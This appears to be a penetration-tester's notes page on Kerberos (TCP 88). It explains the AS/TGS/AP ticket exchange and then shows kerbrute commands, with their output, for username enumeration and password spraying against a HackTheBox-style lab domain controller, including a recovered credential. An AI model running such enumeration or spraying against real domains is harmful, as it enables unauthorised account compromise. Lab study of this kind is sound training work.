---
description: >-
  Enumerate Kerberos Service.
title: KERBEROS (tcp-88)                 # Add title here
date: 2023-02-06 08:00:00 -0600                           # Change the date to match completion date
categories: [01 Enumeration, KERBEROS (tcp-88)]                     # Change Templates to Writeup
tags: [kerberos enumeration]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
# Explanation
The Kerberos authentication protocol used by Microsoft is adopted from the Kerberos version 5 authentication protocol created by MIT and has been used as Microsoft's primary authentication mechanism since Windows Server 2003. While NTLM authentication works through a principle of challenge and response, Windows-based Kerberos authentication uses a ticket system.

At a high level, Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a key distribution center, or KDC. This process is shown below.

![Description](/assets/img/Pasted image 20221113212909.png)

For example, when a user logs in to their workstation, a request is sent to the domain controller, which has the role of KDC and also maintains the Authentication Server service. This _Authentication Server Request_ (or _AS_REQ_) contains a time stamp that is encrypted using a hash derived from the password of the user and the username.

When the domain controller receives the request, it looks up the password hash associated with the specific user and attempts to decrypt the time stamp. If the decryption process is successful and the time stamp is not a duplicate (a potential replay attack), the authentication is considered successful.

The domain controller replies to the client with an _Authentication Server Reply_ (_AS_REP_) that contains a session key (since Kerberos is stateless) and a _Ticket Granting Ticket_ (TGT). The session key is encrypted using the user's password hash, and may be decrypted by the client and reused. The TGT contains information regarding the user, including group memberships, the domain, a time stamp, the IP address of the client, and the session key.

In order to avoid tampering, the Ticket Granting Ticket is encrypted by a secret key known only to the KDC and can not be decrypted by the client. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for 10 hours, after which a renewal occurs. This renewal does not require the user to re-enter the password.

When the user wishes to access resources of the domain, such as a network share, an Exchange mailbox, or some other application with a registered service principal name, it must again contact the KDC.

This time, the client constructs a _Ticket Granting Service Request_ (or _TGS_REQ_) packet that consists of the current user and a timestamp (encrypted using the session key), the SPN of the resource, and the encrypted TGT.

Next, the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. As this point the KDC performs several checks:

1.  The TGT must have a valid timestamp (no replay detected and the request has not expired).
2.  The username from the TGS_REQ has to match the username from the TGT.
3.  The client IP address needs to coincide with the TGT IP address.

If this verification process succeeds, the ticket granting service responds to the client with a _Ticket Granting Server Reply_ or _TGS_REP_. This packet contains three parts:

1.  The SPN to which access has been granted.
2.  A session key to be used between the client and the SPN.
3.  A _service ticket_ containing the username and group memberships along with the newly-created session key.

The first two parts (SPN and session key) are encrypted using the session key associated with the creation of the TGT and the _service ticket_ is encrypted using the password hash of the service account registered with the SPN in question.

Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins.

First, the client sends to the application server an _application request_ or _AP_REQ_ , which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.

The application server decrypts the service ticket using the service account password hash and extracts the username and the session key. It then uses the latter to decrypt the username from the _AP_REQ_. If the _AP_REQ_ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.

This protocol may seem complicated and perhaps even convoluted, but it was designed to mitigate various network attacks and prevent the use of fake credentials.

### Kerbrute

> Tool to validate valid users on the domain, remember that "users" is a dictionary and it must be created even if only one user needs to be tested
{: .prompt-tip }
```bash
kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/seclists/Kerberos/A-ZSurnames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop

2023/01/21 22:44:31 >  Using KDC(s):
2023/01/21 22:44:31 >   10.10.11.168:88

2023/01/21 22:44:31 >  [+] VALID USERNAME:       ASMITH@scrm.local
2023/01/21 22:45:06 >  [+] VALID USERNAME:       JHALL@scrm.local
2023/01/21 22:45:11 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2023/01/21 22:45:13 >  [+] VALID USERNAME:       KHICKS@scrm.local
2023/01/21 22:45:44 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2023/01/21 22:46:15 >  Done! Tested 13000 usernames (5 valid) in 104.092 seconds
```
Example:
[Scrambled](https://shuciran.github.io/posts/Scrambled/#fnref:kerbrute)
[Tentacle](https://shuciran.github.io/posts/Tentacle/#fnref:kerbrute)

### Password Spraying
```bash
kerbrute bruteuser --dc 10.10.11.168 -d scrm.local validUsers ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop

2023/01/21 23:30:54 >  Using KDC(s):
2023/01/21 23:30:54 >   10.10.11.168:88

2023/01/21 23:30:55 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2023/01/21 23:30:55 >  Done! Tested 6 logins (1 successes) in 0.494 seconds
```

Useful resource to get a dictionary with possible users on a domain (test with dot and without it):
[kerberos enum userlists](https://github.com/attackdebris/kerberos_enum_userlists)

#Note If users are found this tool will execute an [[ASREPRoast Attack]]



